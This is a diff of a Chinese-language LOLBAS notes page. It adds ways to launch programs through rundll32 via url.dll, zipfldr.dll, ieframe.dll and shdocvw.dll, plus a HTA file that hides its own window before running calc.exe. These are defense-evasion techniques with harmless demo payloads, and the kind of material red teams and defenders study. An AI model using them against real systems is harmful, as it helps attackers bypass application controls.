@@ -18,6 +18,7 @@
 
 **相关资源**
 - [LOLBAS](https://lolbas-project.github.io/)
+- https://github.com/LOLBAS-Project/LOLBAS
 
 ---
 
@@ -164,6 +165,79 @@ Rundll32.exe 与 Windows 操作系统相关联，可调用从 DLL（16位或32�
 ```cmd
 rundll32.exe \\192.168.1.1\test.dll,0
 ```
+
+**url.dll**
+
+调用 API ShellExecute 打开程序
+```
+rundll32.exe url.dll,FileProtocolHandler calc.exe
+```
+
+执行 js 文件
+```js
+WScript.Echo("1");
+```
+
+```
+rundll32.exe url.dll,OpenURL C:\test\echo.js
+```
+
+执行 hta 文件
+```html
+<HTML>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<HEAD>
+<script language="VBScript">
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject("Wscript.Shell")
+objShell.Run "calc.exe"
+self.close
+</script>
+<body>
+demo
+</body>
+</HEAD>
+</HTML>
+```
+
+```
+rundll32.exe url.dll,OpenURLA C:\test\calc.hta
+```
+
+**zipfldr.dll**
+
+```
+rundll32 zipfldr.dll, RouteTheCall calc.exe
+```
+
+**ieframe.dll**
+
+编写一个 .url 文件
+```
+[InternetShortcut]
+URL=c:\windows\system32\calc.exe
+```
+
+```
+rundll32.exe ieframe.dll,OpenURL C:\test\calc.url
+```
+
+**shdocvw.dll**
+
+编写一个 .url 文件
+```
+[InternetShortcut]
+URL=c:\windows\system32\calc.exe
+```
+
+```
+rundll32.exe shdocvw.dll,OpenURL C:\test\calc.url
+```
+
+**相关文章**
+- [关于利用rundll32执行程序的分析](https://xz.aliyun.com/t/2188)
+- [ABUSING EXPORTED FUNCTIONS AND EXPOSED DCOM INTERFACES FOR PASS-THRU COMMAND EXECUTION AND LATERAL MOVEMENT](https://bohops.com/2018/03/17/abusing-exported-functions-and-exposed-dcom-interfaces-for-pass-thru-command-execution-and-lateral-movement/)
 
 ### Regsvr32.exe
 
